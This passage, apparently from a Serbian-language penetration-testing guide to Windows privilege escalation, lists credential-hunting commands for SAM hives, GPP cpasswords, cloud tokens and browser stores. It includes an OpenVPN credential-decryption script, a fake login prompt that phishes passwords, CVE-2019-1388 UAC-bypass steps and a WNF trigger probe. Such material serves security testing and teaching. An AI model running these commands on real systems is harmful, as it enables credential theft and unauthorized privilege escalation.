Možete i da potražite ove datoteke pomoću **metasploit**: _post/windows/gather/enum_unattend_

Primer sadržaja:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM rezervne kopije

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Čitljive Windows Imaging (`.wim`) backup datoteke mogu sadržati i offline `SAM`, `SECURITY` i `SYSTEM` hive-ove. Dajte prednost lokalno dostupnim direktorijumima sa backup kopijama ili image-ovima i pre izdvajanja proverite **nazive članova** u image-u; samo ime `.wim` datoteke ne dokazuje da su hive-ovi izloženi, a uobičajeni `install.wim`, `boot.wim` i recovery image-ovi često su pogrešni tragovi. SMB share je zaseban način pristupa i treba ga proveriti samo ako je taj share u obuhvatu. Pogledajte Microsoft smernice za [Windows image-ove](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) i [referencu za datoteke hive-ova registra](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Cloud akreditivi

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Potražite datoteku pod nazivom **SiteList.xml**

### Keširana GPP lozinka

Ranije je postojala funkcija koja je omogućavala postavljanje prilagođenih lokalnih administratorskih naloga na grupu računara putem Group Policy Preferences (GPP). Međutim, ovaj metod je imao ozbiljne bezbednosne propuste. Prvo, Group Policy Objects (GPOs), sačuvani kao XML datoteke u SYSVOL-u, bili su dostupni svim korisnicima domena. Drugo, lozinke u ovim GPP-ovima, šifrovane pomoću AES256 i javno dokumentovanog podrazumevanog ključa, mogao je da dešifruje svaki autentifikovani korisnik. To je predstavljalo ozbiljan rizik jer je korisnicima moglo da omogući sticanje povišenih privilegija.

Da bi se ovaj rizik ublažio, razvijena je funkcija za pretragu lokalno keširanih GPP datoteka koje sadrže neprazno polje „cpassword“. Kada pronađe takvu datoteku, funkcija dešifruje lozinku i vraća prilagođeni PowerShell objekat. Ovaj objekat sadrži detalje o GPP-u i lokaciji datoteke, što pomaže u otkrivanju i otklanjanju ove bezbednosne ranjivosti.

Potražite ove datoteke u `C:\ProgramData\Microsoft\Group Policy\history` ili u _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (pre W Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Da biste dešifrovali cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Korišćenje crackmapexec-a za dobijanje lozinki:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Primer web.config datoteke sa podacima za pristup:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Arhive rezervnih kopija u IIS webroot-u

Stara ZIP rezervna kopija postavljena direktno u webroot koji se poslužuje može otkriti ranije konfiguracione datoteke i akreditive koji se mogu ponovo upotrebiti. Proverite konfigurisan fizički put sajta i da li je arhiva zaista dostupna preko HTTP-a pre nego što je smatrate izloženošću. Podrazumevana putanja `C:\inetpub\wwwroot` samo je moguća lokacija. Brz lokalni popis može da prikaže nazive i veličine bez otvaranja arhiva:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Naziv arhive ne dokazuje da ona sadrži tajnu niti da pronađeni akreditiv omogućava veće privilegije.

### OpenVPN akreditivi

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Logovi

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Zatražite akreditive

Uvek možete **zatražiti od korisnika da unese svoje akreditive ili čak akreditive drugog korisnika** ako mislite da ih zna (imajte na umu da je direktno **traženje** **akreditiva** od klijenta zaista **rizično**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Mogući nazivi datoteka koje sadrže pristupne podatke**

Poznate datoteke koje su nekada sadržale **lozinke** u **običnom tekstu** ili formatu **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3 baze podataka obično koriste ekstenziju `.psafe3`. Datoteku sa odgovarajućim nazivom smatrajte kandidatom za šifrovani trezor; njeno prisustvo ne znači da možete da je pročitate, otključate ili upotrebite sačuvane akreditive. Proverite dostupne korisničke profile i podešene korene deljenih datoteka kada pregledate gde se takve datoteke čuvaju.

Čitljiva KeePass `.kdbx` datoteka takođe je samo trag koji upućuje na šifrovani trezor. Za otključavanje su potrebni stvarna glavna lozinka i svi podešeni faktori, kao što su key-file ili nalog. Ako se tokom ovlašćene provere u unosu pronađe par LM:NT hash vrednosti, proverite navedeni nalog i da li je NT hash aktuelan i prihvaćen na ciljnoj NTLM usluzi pre nego što razmotrite [pass-the-hash](../ntlm/README.md#pass-the-hash). Unos u trezoru sam po sebi ne daje prava Administrator ili SYSTEM; moraju biti ispunjeni i uslovi za udaljeni pristup usluzi, prava naloga i svaki zaseban korak za izvršavanje usluge. U popisu treba navesti putanju trezora i da li je čitljiv, a ne prikazivati bazu podataka ili sačuvane akreditive.

Pretražite sve predložene datoteke:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Akreditivi u korpi za otpatke

Proverite dostupne stavke korpe za otpatke u potrazi za izbrisanim rezervnim kopijama i arhivama konfiguracije, kao i datotekama čiji nazivi izričito pominju akreditive. Korisna `.7z`, `.zip` ili `.rar` rezervna kopija može biti stara nekoliko meseci i imati sasvim običan naziv. Windows čuva originalnu putanju i vreme brisanja u `$I` zapisu, a izbrisanu datoteku kao odgovarajući `$R` unos; pre otvaranja arhive proverite metapodatke i da li trenutni identitet ima dozvolu za čitanje. Vidljivost zavisi od volumena, SID-a korisnika i dozvola za datoteke, pa prazan listing ne dokazuje da ne postoji nijedna povratljiva rezervna kopija. Naziv arhive smatrajte kandidatom za proveru, a ne dokazom da sadrži ispravnu tajnu.

Dostupan izbrisani `.pfx` može biti i trag za **code-signing**. Ako sadrži dostupan privatni ključ, tim ključem se može potpisati izmenjena PowerShell skripta; [PowerShell zahteva code-signing sertifikat sa privatnim ključem](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), a [pravila izdavača u AppLocker-u procenjuju identitet potpisnika i opseg pravila](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Izvršavanje pod drugim nalogom zahteva da trenutni identitet može da izmeni konkretnu skriptu, da efektivno pravilo prihvata dobijeni potpis za tu skriptu i ciljni nalog, kao i da planirani zadatak ili drugi potrošač sa višim privilegijama zaista pokrene skriptu. Sam naziv datoteke `.pfx`, predmet sertifikata ili skripta sa dozvolom za upis ne dokazuju da je ovaj lanac uspostavljen. Proverite metapodatke, ACL-ove, pravila i komandu planiranog zadatka pre otvaranja materijala privatnog ključa ili pokretanja zadatka.

Takođe proverite dostupne baze podataka profila messaging klijenata, beleške i primljene datoteke u potrazi za tragovima o akreditivima. Izvezena BitLocker recovery informacija može biti sačuvana kao HTML ili TXT, ponekad unutar arhive rezervne kopije sa odgovarajućim nazivom. Takav materijal može omogućiti pristup zasebnom šifrovanom volumenu podataka koji sadrži starije rezervne kopije; proveravajte volumen i arhivu samo ako imate ovlašćenje za pristup. Ako rezervna kopija sadrži `NTDS.dit`, za offline oporavak akreditiva domena potreban je i odgovarajući `SYSTEM` hive, kao što je opisano u [toku rada za rezervne kopije i privilegovane grupe](../active-directory-methodology/privileged-groups-and-token-privileges.md). Sam naziv datoteke i zaključan volumen ne dokazuju da postoji upotrebljiv ključ za oporavak ili rezervna kopija domena.

Za **oporavak lozinki** sačuvanih u više programa možete koristiti: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Unutar registra

**Ostali mogući ključevi registra sa akreditivima**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Istorija pregledača

Trebalo bi da proverite baze podataka u kojima se čuvaju lozinke iz pregledača **Chrome, Edge ili Firefox**.\
Proverite i istoriju, obeleživače i omiljene stranice pregledača; možda su i tamo sačuvane neke **lozinke**.

Za standardni profil **Default** trenutnog korisnika u Edge-u, `Login Data` se nalazi u `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, dok se `Local State` nalazi u njegovom nadređenom direktorijumu `User Data`. [Microsoft dokumentuje podrazumevanu lokaciju profila](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); drugi profil ili smernica `UserDataDir` mogu da promene ovu lokaciju. Samo postojanje datoteka ukazuje na moguću lokaciju akreditiva: potvrdite da su datoteke čitljive, proverite DPAPI kontekst odgovarajućeg korisnika ili drugi odobreni materijal ključa i utvrdite da li sačuvana prijava pripada nalogu sa višim privilegijama. Enumeracija samo putanja ne mora da otvara bazu podataka niti da ispisuje dešifrovane lozinke.

Za Firefox, [Mozilla dokumentuje](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) da su `key4.db` i `logins.json` u profilu uparene datoteke ključa i šifrovanih prijava. Njihovo postojanje samo ukazuje na moguću lokaciju akreditiva: proverite da li su obe datoteke čitljive, da li postoje sačuvani unosi i da li Primary Password štiti ključ pre nego što zaključite da se akreditivi mogu koristiti. Ako pronađeni akreditiv pripada domenskom nalogu, zasebno proverite efektivna prava tog naloga za upravljanje grupama i [prava grupe za čitanje ili dešifrovanje LAPS lozinke](../active-directory-methodology/laps.md); artefakti pregledača sami po sebi ne dokazuju put do administratorskih privilegija.

Alati za izdvajanje lozinki iz pregledača:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** je tehnologija ugrađena u operativni sistem Windows koja omogućava **međusobnu komunikaciju** između softverskih komponenti napisanih na različitim jezicima. Svaka COM komponenta je **identifikovana pomoću ID-ja klase (CLSID)**, a svaka komponenta izlaže funkcionalnost preko jednog ili više interfejsa, identifikovanih ID-jevima interfejsa (IID).

COM klase i interfejsi definisani su u registru, redom pod ključevima **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface**. Ovaj registar nastaje spajanjem ključeva **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

U okviru CLSID-ova ovog registra možete pronaći podključ registra **InProcServer32**, koji sadrži **podrazumevanu vrednost** koja upućuje na **DLL**, kao i vrednost pod nazivom **ThreadingModel**, čija vrednost može biti **Apartment** (jedna nit), **Free** (više niti), **Both** (jedna ili više niti) ili **Neutral** (nezavisno od niti).

![Istorija pregledača - COM DLL Overwriting: U okviru CLSID-ova ovog registra možete pronaći podključ registra InProcServer32, koji sadrži podrazumevanu vrednost koja upućuje na DLL i vrednost...](<../../images/image (729).png>)

U suštini, ako možete da **zamenite bilo koju DLL datoteku** koja će biti izvršena, mogli biste da **eskalirate privilegije** ako tu DLL datoteku izvršava drugi korisnik.

Da biste saznali kako napadači koriste COM Hijacking kao mehanizam postojanosti, pogledajte:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Opšta pretraga lozinki u datotekama i registru**

**Pretraga sadržaja datoteka**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Pretražite datoteku sa određenim imenom**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Pretražite registry u potrazi za nazivima ključeva i lozinkama**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Alati koji traže lozinke

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **je msf** plugin koji sam napravio da bi **automatski izvršavao svaki Metasploit POST modul koji traži podatke za prijavu** na žrtvinom sistemu.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatski pretražuje sve datoteke koje sadrže lozinke navedene na ovoj stranici.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) je još jedan sjajan alat za izvlačenje lozinki iz sistema.

Alat [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) traži **sesije**, **korisnička imena** i **lozinke** za nekoliko alata koji čuvaju ove podatke u čistom tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Zamislite da **proces koji radi kao SYSTEM otvori novi proces** (`OpenProcess()`) sa **punim pristupom**. Isti proces **takođe kreira novi proces** (`CreateProcess()`) **sa niskim privilegijama, ali tako da nasleđuje sve otvorene handlove glavnog procesa**.\
Zatim, ako imate **puni pristup procesu sa niskim privilegijama**, možete da preuzmete **otvoreni handle privilegovanog procesa** kreiranog pomoću `OpenProcess()` i **ubacite shellcode**.\
[Pročitajte ovaj primer da biste saznali više o tome **kako da otkrijete i iskoristite ovu ranjivost**.](leaked-handle-exploitation.md)\
[Pročitajte i **ovu drugu objavu za detaljnije objašnjenje kako da testirate i zloupotrebite dodatne otvorene handlove procesa i niti nasleđene sa različitim nivoima dozvola (ne samo sa punim pristupom)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segmenti deljene memorije, koji se nazivaju **pipes**, omogućavaju komunikaciju i prenos podataka između procesa.

Windows pruža funkciju pod nazivom **Named Pipes**, koja omogućava nepovezanim procesima da dele podatke, čak i preko različitih mreža. To je slično arhitekturi klijent/server, sa ulogama definisanim kao **named pipe server** i **named pipe client**.

Kada **klijent** pošalje podatke kroz pipe, **server** koji je podesio pipe može da **preuzme identitet** **klijenta**, pod uslovom da ima neophodna prava **SeImpersonate**. Pronalaženje **privilegovanog procesa** koji komunicira preko pipe-a koji možete da imitujete pruža priliku da **dobijete veće privilegije** preuzimanjem identiteta tog procesa kada stupi u interakciju sa pipe-om koji ste uspostavili. Uputstva za izvođenje takvog napada potražite [**ovde**](named-pipe-client-impersonation.md) i [**ovde**](#from-high-integrity-to-system).

Sledeći alat takođe omogućava **presretanje komunikacije preko named pipe-a pomoću alata kao što je Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **a ovaj alat omogućava izlistavanje i pregled svih pipe-ova radi pronalaženja privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony servis (TapiSrv) u serverskom režimu izlaže `\\pipe\\tapsrv` (MS-TRP). Udaljeni autentifikovani klijent može da zloupotrebi asinhroni put događaja zasnovan na mailslot-u i pretvori `ClientAttach` u proizvoljan **upis od 4 bajta** u bilo koju postojeću datoteku u koju `NETWORK SERVICE` može da upisuje, a zatim dobije Telephony administratorska prava i učita proizvoljan DLL kao servis. Ceo postupak:

- Pozovite `ClientAttach` sa `pszDomainUser` postavljenim na postojeću putanju u koju može da se upisuje → servis je otvara preko `CreateFileW(..., OPEN_EXISTING)` i koristi je za asinhroni upis događaja.
- Svaki događaj upisuje napadačem kontrolisani `InitContext` iz `Initialize` u taj handle. Registrujte line app pomoću `LRegisterRequestRecipient` (`Req_Func 61`), pokrenite `TRequestMakeCall` (`Req_Func 121`), preuzmite događaje pomoću `GetAsyncEvents` (`Req_Func 0`), a zatim je odregistrujte/isključite da biste ponovili determinističke upise.
- Dodajte sebe u `[TapiAdministrators]` u `C:\Windows\TAPI\tsec.ini`, ponovo se povežite, a zatim pozovite `GetUIDllName` sa putanjom proizvoljnog DLL-a da biste izvršili `TSPI_providerUIIdentify` kao `NETWORK SERVICE`.

Više detalja:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Razno

### Ekstenzije datoteka koje mogu da izvrše sadržaj u Windows-u

Pogledajte stranicu **[https://filesec.io/](https://filesec.io/)**

### Zloupotreba protocol handler-a / ShellExecute-a preko Markdown renderer-a

Klikabilni Markdown linkovi prosleđeni funkciji `ShellExecuteExW` mogu da pokrenu opasne URI handler-e (`file:`, `ms-appinstaller:` ili bilo koju registrovanu šemu) i izvrše datoteke koje kontroliše napadač kao trenutni korisnik. Pogledajte:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Nadgledanje komandnih linija radi pronalaženja lozinki**

Kada dobijete shell kao korisnik, možda postoje zakazani zadaci ili drugi procesi koji se izvršavaju i **prosleđuju akreditive kroz komandnu liniju**. Skripta ispod beleži komandne linije procesa svake dve sekunde i upoređuje trenutno stanje sa prethodnim, prikazujući sve razlike.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Krađa lozinki iz procesa

## Od korisnika sa niskim privilegijama do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Ako imate pristup grafičkom interfejsu (preko konzole ili RDP-a) i UAC je omogućen, u nekim verzijama Microsoft Windows-a moguće je pokrenuti terminal ili bilo koji drugi proces kao „NT\AUTHORITY SYSTEM“ sa neprivilegovanog korisničkog naloga.

To omogućava istovremenu eskalaciju privilegija i zaobilaženje UAC-a pomoću iste ranjivosti. Pored toga, nije potrebno ništa instalirati, a binarni fajl koji se koristi tokom procesa potpisao je i izdao Microsoft.

Neki od pogođenih sistema su:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Da biste iskoristili ovu ranjivost, potrebno je izvršiti sledeće korake:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Imate sve neophodne datoteke i informacije u ovom GitHub repozitorijumu:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Od Administrator Medium do High Integrity Level / UAC Bypass

Pročitajte ovo da biste **naučili o nivoima integriteta**:


{{#ref}}
integrity-levels.md
{{#endref}}

Zatim **pročitajte ovo da biste naučili o UAC-u i UAC bypass-ima:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junction-i u direktorijumu za otpremanje unutar direktorijuma koji se poslužuje

Aplikacija može da kreira predvidljiv poddirektorijum za otpremanje, upiše u njega ime datoteke koje je dostavio pozivalac, a zatim obradi tu datoteku. Ako korisnik sa niskim privilegijama može da ukloni i zameni taj poddirektorijum NTFS junction-om pre upisa na strani servera, upis može preko junction-a dospeti u direktorijum koji se poslužuje preko veba. Skripta smeštena tamo može da se pokrene kao identitet veb-servisa ako server izvršava taj tip datoteke. Ovo je granica proizvoljnog upisa specifična za aplikaciju; direktorijum za otpremanje u koji može da se upisuje ili postojeći junction sami po sebi to ne dokazuju.

Proverite tačan način formiranja putanje i tajming u handler-u za otpremanje, efektivna prava korisnika za brisanje/kreiranje poddirektorijuma, efektivne ACL-ove odredišta, da li proces koji upisuje prati tačke ponovnog razčlanjivanja i da li veb-server izvršava datoteke u tom odredištu. Zasebno potvrdite identitete procesa koji upisuje i veb-servera. Pasivna inventarizacija može da prikaže ACL-ove direktorijuma i metapodatke o reparse tačkama, ali ne može da utvrdi ponašanje handler-a ili buduću zamenu junction-a. Ako se izvršavanje odvija pod nalogom servisnog naloga, pregledajte **stvarni token procesa** pre razmatranja zasebnog puta preko privilegija tokena.

## Čišćenje zakazanog zadatka sa privilegijama pokrenuto putem WNF-a

Zakazani zadatak koji odbija ručno pokretanje ipak može da izloži okidač koji može da aktivira korisnik bez privilegija. Prilikom provere zakazanog zadatka sa privilegijama, izvezite njegov XML i pregledajte **sve** okidače, kao i DACL, principal i akciju zadatka. Posebno, `WnfStateChangeTrigger` navodi stanje Windows Notification Facility (WNF); ako to stanje, koje podržava securable permissions, dozvoljava trenutnom korisniku da objavi ažuriranje, korisnik može posredno da pokrene zadatak pod konfigurisanim identitetom, uprkos `<AllowStartOnDemand>false</AllowStartOnDemand>`.<sup>[[43]](#references)</sup>

Na primer, zadatak Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` radio je kao SYSTEM, prihvatao ažuriranja WNF stanja `7508BCA32C079E41` od standardnog korisnika, a zatim proveravao `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` čak i kada je Recall bio onemogućen.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Da biste testirali dostupnost, razrešite `ZwUpdateWnfStateData` iz `ntdll.dll`, pošaljite prazno ažuriranje za osmobajtni naziv stanja i uporedite status povratne vrednosti sa podacima o poslednjem pokretanju zadatka ili aktivnošću u Procmon-u. Sledeća pojednostavljena proba koristi niz bajtova iz primera zadatka Recall; zamenite ga bajtovima izvezenim za zadatak koji testirate.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Pretvaranje rekurzivnog čišćenja u privilegovano brisanje

Korisni primitiv nije samo okidač, već privilegovana rutina za čišćenje koja prihvata direktorijum pod kontrolom napadača. Pratite operaciju od enumeracije do konačne izmene: otkrivanje profila/sesija, izbor podređenih stavki pomoću džokera, `SHCreateItemFromParsingName` i `IFileOperation::DeleteItem` jaki su pokazatelji da će se prethodno proverena putanja kasnije rekurzivno obrađivati. Ako se potomci ne otvaraju relativno u odnosu na pouzdane ručke direktorijuma i ne validiraju pre brisanja, napadač može da promeni razrešavanje putanje između enumeracije i upotrebe.<sup>[[43]](#references)</sup>

Uparite WNF okidač sa [oplock, junction i Object Manager symlink substitution](#from-folder-contents-delete-to-system-eop) tehnikom opisanom ispod: oplock pauzira alat za čišćenje nakon što izabere legitimnu podređenu stavku, dok se upisivi predak zamenjuje tako da se, nakon nastavka, privilegovano brisanje razrešava preko `\RPC Control` do zaštićene mete. U Recall lancu, to je omogućilo brisanje `C:\Config.Msi` u kontekstu SYSTEM, što je potrebno za dokumentovanu MSI rollback tehniku.<sup>[[31]](#references)[[43]](#references)</sup>

### Ugnježdeni potomci zaobilaze površne popravke reparse point-a

